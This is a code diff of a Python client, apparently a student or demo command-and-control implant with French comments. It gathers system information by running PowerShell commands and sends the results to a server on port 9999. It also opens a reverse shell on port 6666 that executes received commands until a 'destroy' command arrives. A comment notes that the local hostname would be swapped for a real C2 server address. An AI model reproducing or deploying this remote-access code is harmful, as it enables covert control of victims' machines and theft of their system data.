@@ -6,10 +6,10 @@ __author__ = 'Karl Boulais'
 
 import socket
 import os
-import subprocess
 import sys
 import json
 import threading
+import subprocess
 from time import sleep
 
 from powershell import Powershell
@@ -21,7 +21,6 @@ class Client():
     def _sending(self, s, data):
         return s.send(bytes(json.dumps(data), "UTF-8"))
          
-    
     def _receiving(self, s):
         data = ""
         while True:
@@ -31,41 +30,50 @@ class Client():
             except ValueError:
                 continue
         
-
     def _sendingData(self):
-        s = socket.socket()
+        # Dans un cas réel on changerais 'ip' pour l'adresse réel du serveur de commande et contrôle
         ip = socket.gethostname()
         host = ip
         port = 9999
-        quitting = False
-        s.connect((host, port))
-        data = {}
 
-        # data["message"] = "Voici de l'information: TEST"
-        self._sending(s, data)
-        sleep(1)
+        s = socket.socket()
+        # Démarre le processus de connexion
+        while True:
+            try:
+                s.connect((host, port))
+                break
+            except TimeoutError:
+                continue
+
+        data = {}
+        
+        # TODO envoi les données du système changer la fonction
+        for command in Powershell.GetInfo:
+            data[command.name] = subprocess.check_output(command.value).decode("Windows-1252")
+            
+        # print(data)
         data["message"] = "exit"
         self._sending(s, data)
         s.close
-        # TODO envoi les données du système changer la fonction
-        # while True:
-        #     data["message"] = input('> ')
-        #     if data["message"].lower() == "exit":
-        #         self._sending(s, data)
-        #         s.close
-        #         break
 
-        #     self._sending(s, data)
 
-    
     def _ReverseShell(self):
-        s = socket.socket()
-        ip = socket.gethostname()
+        # Dans un cas réel on changerais 'ip' pour l'adresse réel du serveur de commande et contrôle
+        ip = socket.gethostname() 
         host = ip
         port = 6666
-        quitting = False
-        s.connect((host, port))
+
+        # Démarre le processus de connexion
+        s = socket.socket()
+        while True:
+            try:
+                s.connect((host, port))
+                break
+            except TimeoutError:
+                continue
+
     
+        quitting = False
         data = {}
 
         while not quitting:
@@ -77,8 +85,6 @@ class Client():
             # on reçoit la commande à exécuter
             data = self._receiving(s)
             
-            
-            # on 
             if data["command"].lower() == "destroy":
                 quitting = True
                 self._sending(s, data)
@@ -98,13 +104,12 @@ class Client():
             
 
     def main(self):
-        
         for connection in self._connectionThreadList:
             threading.Thread(target=connection).start()
 
 
 if __name__ == "__main__":
-   Client().main()
+   exit(Client().main())
 
 
 '''
